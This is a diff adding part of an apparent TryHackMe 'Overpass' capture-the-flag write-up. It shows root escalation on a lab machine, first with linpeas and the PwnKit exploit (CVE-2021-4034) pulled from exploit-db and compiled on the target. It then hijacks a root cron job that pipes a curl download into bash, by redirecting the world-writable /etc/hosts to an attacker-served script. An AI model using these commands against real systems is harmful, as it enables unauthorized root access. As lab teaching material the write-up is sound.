@@ -167,5 +167,174 @@ First, I'll open up a http server with python on my host machine, in the directo
 
 <br>
 
-And then, on the target machine, I'll use wget to download the linpeas.sh file. This will only work in a directory where 
+And then, on the target machine, I'll use wget to download the linpeas.sh file. This will only work in a directory where our user has read+write access, so I'll use the /tmp directory:
 
+<br> 
+
+``wget [my-ip]:4444/usr/share/peass/linpeas/linpeas.sh``
+
+<br>
+
+And now that we have linpeas on our target, let's change the file mode bits with chmod, to make linpeas.sh an executable for us:
+
+<br>
+
+``chmod +x linpeas.sh``
+
+<br>
+
+And then run it:
+
+<br>
+
+``./linpeas.sh``
+
+<br><br>
+
+linpeas will show a lot of information. And a lot of it is not really of interest to us. However, it does show us a couple of interesting things, that can be potentially exploited. 
+
+The first one is a very likely exploit, found by the CVEs Check. The exploit is CVE-2021-4034 (PolicyKit-1 0.105-31). 
+
+Further down, it tells us a download link from github which we technically could use wget a command to get, but it doesn't seem to be working very well on our target.. 
+However, we can look it up on exploit-db and see what it's all about: 
+
+https://www.exploit-db.com/exploits/50689
+
+<br>
+
+Ah. So we can actually just create a couple of files in our tmp directory, based on the code from the website, and then run the code afterwards, using the commands shown.
+
+Let's make the files: 
+
+``nano evil-so.c``
+
+<br>
+
+And we put the code from the page, where it says "##### evil-so.c #####", into the file. Then we save it and move on to the next one:
+
+``nano exploit.c``
+
+<br>
+
+And we do the same thing here as well, copy-pasting the code, where it says "##### exploit.c #####". 
+
+<br><br>
+
+Just to be sure, I make the files executable:
+
+``chmod +x evil-so.c``
+
+``chmod +x exploit.c``
+
+<br>
+
+Now, let's run the gcc commands, shown on the website:
+
+``gcc -shared -o evil.so -fPIC evil-so.c``
+
+``gcc exploit.c -o exploit``
+
+<br>
+
+And then run the file called "exploit":
+
+``./exploit``
+
+<br><br>
+
+BOOM! We are root! 
+
+``whoami``
+
+<br>
+
+Now, we don't have an interactive shell, but that can easily be solved with:
+
+``/bin/bash``
+
+<br>
+
+And just like stealing candy from a baby, there is nothing stopping us from going straight into the /root directory and getting our flag:
+
+``cd /root && ls -l``
+
+``cat root.txt``
+
+<br>
+
+![billede](https://user-images.githubusercontent.com/78546461/200057349-7a343073-7523-4303-8696-cb9f59729428.png)
+
+<br>
+
+---
+
+### This is the most probable way, that TryHackMe actually intended us to use
+
+<br>
+
+If we go back to the step where we had used linpeas to enumerate and then focus on a line further down, we can see that there's a cron job running every minute:
+
+<br>
+
+![billede](https://user-images.githubusercontent.com/78546461/200057999-667b11a6-b1b8-4eb7-bf0f-6435c53155d4.png)
+
+<br>
+
+So from what we can see here, the command ``root curl overpass.thm/downloads/src/buildscript.sh | bash`` is running every minute.
+
+This means that each minute, the command will pipe the script "buildscript.sh" into bash, with root privileges. And the script seems to be on a different server.. 
+
+Hmmm... Wonder if we can do anything with that.. hehe..
+
+<br>
+
+If we take a look into the folder /etc/hosts, we'll actually find *overpass.thm* and the corresponding IP address. 
+
+And guess what.. the file is world-writable! So we can just edit it if we want.. Oh boy, this means trouble!
+
+<br>
+
+Let's edit it, to make a request to our IP address instead.
+
+But first, we have to make the necessary directories and script, so that it actually has something to download.
+
+So, on our host machine, we can go into the / directory, ``cd /`` and then use the commands:
+
+``sudo mkdir downloads/src -p``
+
+``sudo nano buildscript.sh``
+
+<br>
+
+And then we can write our script, which will be executed by the target, with root privileges. Let's not forget the *#!/bin/bash* at the top of our script:
+
+``#!/bin/bash
+
+  sudo cp /root/root.txt /root.txt && chmod +r /root.txt james``
+  
+<br>
+
+And then, we can go back into the / directory, and with ``ls -l``, we can see that we now have a *root.txt* file, which we can read from.
+
+Let's read it then! ``cat root.txt``
+
+<br>
+
+![billede](https://user-images.githubusercontent.com/78546461/200060519-49250209-8f08-4404-9512-1544f1171580.png)
+
+<br>
+
+And that's it!
+
+Two different ways of getting the flag.
+
+<br>
+
+We could also have used a reverse shell or gotten the flag in other ways, but for the sake of simplicity, I'll stop here. 
+
+However, feel free coming up with new ways of getting the root flag, by editing the *buildscript*.sh script in the /downloads/src directory, on your host machine. 😈
+
+<br><br>
+
+
+#### Made by PatrickSkovgaard, otherwise known as AgoraPat on TryHackMe 
